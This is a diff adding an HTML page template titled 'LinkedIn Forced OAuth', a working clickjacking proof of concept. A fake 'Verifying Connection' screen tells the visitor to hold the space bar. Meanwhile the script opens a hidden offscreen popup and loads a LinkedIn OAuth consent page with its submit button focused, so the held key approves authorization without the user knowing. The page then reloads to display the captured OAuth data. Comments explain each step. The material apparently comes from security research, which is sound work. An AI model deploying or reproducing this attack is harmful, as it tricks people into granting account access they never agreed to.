@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LinkedIn Forced OAuth</title>
+    <style>
+      html,
+      body {
+        height: 100%;
+        width: 100%;
+        margin: 0;
+        font-family: Arial, sans-serif;
+      }
+      .container {
+        align-items: center;
+        display: flex;
+        justify-content: center;
+        height: 100%;
+        width: 100%;
+      }
+      .bar {
+        display: inline-block;
+        width: 3px;
+        height: 20px;
+        background-color: black;
+        margin: 1px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div>
+        <h1>Verifying Connection</h1>
+        <p>Hold space to continue...</p>
+        <div id="progress"></div>
+      </div>
+    </div>
+
+    <script>
+      window.name = "main";
+
+      const target = "{{ url|safe }}#oauth__auth-form__submit-btn";
+
+      // 1. Setup HTML progress bar
+      const progressElem = document.getElementById("progress");
+      for (let i = 0; i < 100; i++) {
+        const bar = document.createElement("div");
+        bar.className = "bar";
+        progressElem.appendChild(bar);
+      }
+
+      // 2. Prepare blob URL with script that:
+      //    - Puts focus back on the main window
+      //    - Redirects itself to the oauth URL
+      const blob = new Blob(
+        [
+          `
+    <script>
+      onkeydown = (e) => {
+        window.open("invalid://", "main");
+        location = "${target}";
+      };
+    <\/script>
+        `,
+        ],
+        { type: "text/html" }
+      );
+      const blobUrl = URL.createObjectURL(blob);
+
+      // Some prefetch rules to make the blob page load faster
+      const specScript = document.createElement("script");
+      specScript.type = "speculationrules";
+      const specRules = {
+        prefetch: [
+          {
+            source: "list",
+            urls: [blobUrl],
+          },
+        ],
+      };
+      specScript.textContent = JSON.stringify(specRules);
+      document.body.append(specScript);
+
+      let count = 0;
+      onkeydown = () => {
+        // 3. Ask user to hold space, increment progress bar while they do
+        if (event.key !== " ") return;
+
+        count++;
+        document.querySelectorAll(".bar")[count - 1].style.backgroundColor = "lime";
+        // 4. After 10 presses, they are likely holding space. Open blob URL which instantly focusses back here creating a popunder
+        if (count === 10) {
+          w = open(blobUrl, "popup", "width=1,height=1,left=9999,top=9999");
+          w.moveTo(9999, 9999);
+        }
+        // 5. After 90 presses, oauth URL has likely loaded. Open it with the #oauth__auth-form__submit-btn hash to focus button
+        if (count === 90) {
+          // Popup with focus on target button
+          w = open(target, "popup");
+          const loop = setInterval(() => {
+            w.location = target;
+          }, 10);
+          setTimeout(() => {
+            clearInterval(loop);
+
+            // 6. While the user holds space, they press the button and redirect to callback, closing the popup
+            const checkClosed = setInterval(() => {
+              if (w.closed) {
+                // 7. After that finishes, reload the page which should display oauth data from session
+                location.reload();
+                clearInterval(checkClosed);
+              }
+            }, 100);
+          }, 100);
+          onkeydown = null;
+        }
+      };
+    </script>
+  </body>
+</html>
